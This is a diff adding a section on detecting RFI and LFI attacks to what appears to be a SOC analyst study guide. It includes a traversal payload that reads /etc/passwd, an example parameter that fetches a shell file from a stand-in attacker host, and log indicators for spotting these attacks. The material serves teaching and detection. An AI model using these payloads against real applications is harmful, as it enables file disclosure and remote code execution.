@@ -279,4 +279,36 @@ Because IDOR attacks do not use obvious malicious payloads, detection relies pri
 ---
 
 
+## 9) Detecting RFI & LFI Attacks
+
+## Nature & Classification
+File Inclusion vulnerabilities occur when a web application includes a file based on user input without proper validation or sanitization.
+- **LFI (Local File Inclusion):** The included file is located on the **same server** hosting the web application. Attackers typically use LFI to read sensitive system files (e.g., password files like `/etc/passwd`).
+- **RFI (Remote File Inclusion):** The included file is hosted on a **remote server** controlled by the attacker. This allows the attacker to embed and execute malicious code directly on the target server.
+
+## Mechanism & Sample Payloads
+Attackers often exploit features that require a file path parameter (e.g., a language selector `?language=en`).
+- **Directory Traversal:** Using the `../` string to navigate backward through parent directories until reaching the root directory.
+- **Null Byte Injection:** Appending `%00` at the end of the payload to signal the end of the string. This forces the system to ignore any default file extensions appended by the application (e.g., `.php`).
+- **Classic LFI Payload:** `?language=/../../../../../../../../../etc/passwd%00`
+
+## Consequences (Impact)
+- Disclosure of sensitive information.
+- Executing code / Remote Code Execution (RCE).
+- Denial of Service (DoS).
+
+## Prevention Methods (For Developers)
+- The most effective mitigation is to thoroughly sanitize and validate all data received from users before it is processed.
+- Implement security controls on **both the client and server sides** (client-side controls alone can be easily bypassed by attackers).
+
+## Detection & Log Analysis (For SOC Analysts)
+- **Examine all parameters:** The vulnerability can exist in any field of the HTTP request.
+- **LFI Indicators:** Look for special characters used for directory traversal, such as `/`, `.`, `\` (or their URL-encoded equivalents like `%2e%2e%2f`). Identify unauthorized access attempts to critical system files (e.g., `/etc/passwd` on Linux, `boot.ini` on Windows).
+- **RFI Indicators:** Look for protocols such as `http://` or `https://` injected into URL parameters (e.g., `?page=http://malicious.com/shell.txt`), which indicates an attempt to fetch a file from an external server.
+
+---
+
+
+
+
 
